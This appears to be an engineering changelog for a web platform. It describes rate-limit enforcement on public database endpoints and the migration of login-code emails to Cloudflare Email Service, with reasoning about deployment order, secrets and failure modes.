**Published-site side (`rate-limit.mjs`, live 2026-07-28)**: `/api/db/*` is public and unauthenticated by design, and the schema engine's per-table `rateLimit` + per-app `rateLimits {read, write}` had been parsed and stored in `_meta` since it was written with **nothing ever reading them**. Now enforced in `site-data.mjs` (after the table is resolved, so the declared limit is known — and BEFORE the visitor is resolved, which is a database read) and on the auth branch of `worker.js`. Defaults 300 reads/min, 60 writes/min; a table's own `rateLimit` is a WRITE limit and wins (most-specific, not most-restrictive — both numbers are the owner's own). **Reads share one bucket per site** (the budget protects Neon compute; a page with five lists must not get 5×) while **writes get one per table** (a table capped at 5/min must not share those 5 with the contact form). **Keys on `CF-Connecting-IP` ONLY** — the `|| X-Forwarded-For` fallback the rest of worker.js uses would defeat it entirely, since a caller varying that header mints a fresh bucket per request; no header at all shares the "unknown" bucket. Auth gets a second per-IP gate (30/min, `me` exempt) on top of handleSiteAuth's per-address one, which an attacker rotating addresses walks through. **Fixed a live bug on the way**: `authThrottle` counted with `ttl-cache`, whose `set` re-stamps the expiry, so a blocked caller EXTENDED their own window and never recovered — `makeLimiter` fixes `resetAt` at the first hit. Per-isolate, so a distributed flood still gets through; a real limiter needs Durable Objects. `test/rate-limit.test.mjs` (26 tests, all mutation-checked).

## Auth emails — Cloudflare Email Service (2026-07-30)

**Go Farther was stopped (owner's call), so isibi's own auth mail moved to Cloudflare Email Service.** Sending is **beta**, Workers Paid, 3,000/month included then **$0.35 per 1,000**; inbound routing stays free and unlimited. Limits: 5 MiB a message, 50 recipients, 16 KB of headers, subject 998 chars — and **the daily quota is NOT published**: new accounts start conservative and ramp on sending behaviour and deliverability. That ramp is the one real risk of putting login codes on it, and no document answers it; only sending does.

- **Two senders, on two platforms, and that decides the mechanism for each.** The Worker uses the **`send_email` binding** (`{"name": "EMAIL"}` in `wrangler.jsonc`, `env.EMAIL.send({from,to,subject,html,text})` → `{messageId}`) — **no token to mint, store in GitHub Actions, upload each deploy, or rotate**, which is the actual reason to prefer Cloudflare here. The Supabase `send-email` Edge Function runs on Deno and **cannot** use a binding, so it posts to `https://api.cloudflare.com/client/v4/accounts/{id}/email/sending/send` with a Bearer token. That is the only token in the system: `CF_ACCOUNT_ID` + `CF_EMAIL_TOKEN` in Supabase's Edge Function secrets, NOT in `deploy.yml`.
- **`env.EMAIL` is `undefined` until sending is enabled and the domain is verified**, not an error — so an unprovisioned binding is a TypeError on whatever public endpoint touched it. `sendMail()` refuses with a named message and `notifyOwnerOfSubmission` no-ops on `!env.EMAIL`. Guarded at BOTH ends: one test asserts the Worker calls `env.EMAIL.send`, another asserts `wrangler.jsonc` declares that exact name — either alone passes on a Worker calling a binding nobody declared.
- **DO NOT deploy the rewritten Edge Function before the secrets exist.** Today's live v6 still names the Go Farther key, which is still *set*, so it passes its config check, calls a stopped account, logs the 401 in the background and returns 200 — sign-in completes and no code arrives. The new one returns **500** at the config check, which GoTrue reports as a failed hook, so signup and code sign-in would error **at the door** instead of silently not delivering. Mail has to be proven working first; the switch is last.
- **No idempotency key any more.** Cloudflare's send body is `to/from/subject/html/text` and its API reference showed nothing for one; sending an unknown field risks the whole request being refused. Go Farther had one, so a GoTrue hook retry can now deliver the same code twice — a smaller problem than a rejected body, and the codes stay single-use.
- **The background send stays**, and not as an optimisation: GoTrue aborts this hook after 5s and a signup that trips it fails outright with "Failed to reach hook within maximum time". Cloudflare should beat Go Farther's ~3.5-4s round trip, but the hook must not depend on that.
- Every message carries a **plain-text part**, derived from the html when a caller gives none — a message with no text/plain alternative scores worse with spam filters, and a booking notification in a junk folder is the same as one never sent.
- **`notifyOwnerOfSubmission` has ZERO callers.** It lost its trigger point when `site-data.mjs` was deleted, so its sender was migrated but nothing reaches it. Re-wiring needs a Postgres trigger writing to a queue table plus the existing 2-minute cron, because there is no `http` extension to call out from Neon.
- **Still on the old brand:** the login-code email is `#0a0a0b` with the pink→amber gradient logo, from before the platform went black-and-white on 2026-07-23. Left alone deliberately — design is the owner's call — and it is the one customer-facing surface still wearing it.
